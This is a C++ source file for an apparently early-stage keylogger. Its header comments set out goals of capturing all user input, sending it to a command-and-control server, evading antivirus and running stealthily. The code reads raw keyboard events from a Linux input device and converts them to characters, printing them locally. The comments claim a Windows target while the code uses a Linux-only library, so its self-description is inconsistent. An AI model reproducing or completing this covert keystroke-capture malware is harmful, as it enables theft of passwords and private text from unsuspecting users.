// General features
// ================================================
// Get all user Input
// Sends it over a secure socket to a C&C server
//
// Specific features
// ================================================
// Be undetectable to AV
// Be a x86 software for max compatibility
// Be stealth
// Run on Windows
// Run on background
// Need to find you the input event automatically
// Auto detect keyboard layout

#include <fcntl.h>
#include <iostream>
#include <libevdev-1.0/libevdev/libevdev.h>
#include <linux/input.h>
#include <string.h>
#include <unistd.h>
#include <unordered_map>

using namespace std;

int main() {
    const char* device = "/dev/input/event4"; // Need to find a way to look for it automatically
    int fd = open(device, O_RDONLY | O_NONBLOCK);

    struct libevdev* dev;
    int rc = libevdev_new_from_fd(fd, &dev);

    std::unordered_map<int, char> keycodeToAscii = {
        // Letters
        {KEY_A, 'a'}, {KEY_B, 'b'}, {KEY_C, 'c'}, {KEY_D, 'd'},
        {KEY_E, 'e'}, {KEY_F, 'f'}, {KEY_G, 'g'}, {KEY_H, 'h'},
        {KEY_I, 'i'}, {KEY_J, 'j'}, {KEY_K, 'k'}, {KEY_L, 'l'},
        {KEY_M, 'm'}, {KEY_N, 'n'}, {KEY_O, 'o'}, {KEY_P, 'p'},
        {KEY_Q, 'q'}, {KEY_R, 'r'}, {KEY_S, 's'}, {KEY_T, 't'},
        {KEY_U, 'u'}, {KEY_V, 'v'}, {KEY_W, 'w'}, {KEY_X, 'x'},
        {KEY_Y, 'y'}, {KEY_Z, 'z'},
        
        // Numbers
        {KEY_1, '1'}, {KEY_2, '2'}, {KEY_3, '3'}, {KEY_4, '4'},
        {KEY_5, '5'}, {KEY_6, '6'}, {KEY_7, '7'}, {KEY_8, '8'},
        {KEY_9, '9'}, {KEY_0, '0'},
        
        // Special characters
        {KEY_MINUS, '-'}, {KEY_EQUAL, '='}, {KEY_BACKSPACE, '<'},
        {KEY_ENTER, '\n'}
    };

    bool shiftPressed = false;

    while (true) {
        struct input_event ev;
        rc = libevdev_next_event(dev, LIBEVDEV_READ_FLAG_NORMAL, &ev);
        if (rc == 0) {
            if (ev.type == EV_KEY) {
                if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) shiftPressed = !shiftPressed;

                if (ev.value == 1) {
                    auto it = keycodeToAscii.find(ev.code);
                    if (it != keycodeToAscii.end()) {
                        char asciiChar = it->second;
                        if (shiftPressed) {
                            if (asciiChar >= 'a' && asciiChar <= 'z') asciiChar = toupper(asciiChar);

                            switch (asciiChar)
                            {
                                case '1':
                                    asciiChar = '!';
                                    break;
                                case '2':
                                    asciiChar = '@';
                                    break;
                                case '3':
                                    asciiChar = '#';
                                    break;
                                case '4':
                                    asciiChar = '$';
                                    break;
                                case '5':
                                    asciiChar = '%';
                                    break;
                                case '6':
                                    // Not going to include this weird characters as no one uses it
                                    break;
                                case '7':
                                    asciiChar = '&';
                                    break;
                                case '8':
                                    asciiChar = '*';
                                    break;
                                case '9':
                                    asciiChar = '(';
                                    break;
                                case '0':
                                    asciiChar = ')';
                                    break;
                                default:
                                    break;
                            }
                        }
                        cout << asciiChar << flush;
                    } else {
                        cout << ev.code << flush;
                    }
                }
            }
        }
        usleep(1000);
    }

    libevdev_free(dev);
    close(fd);

    return 0;
}
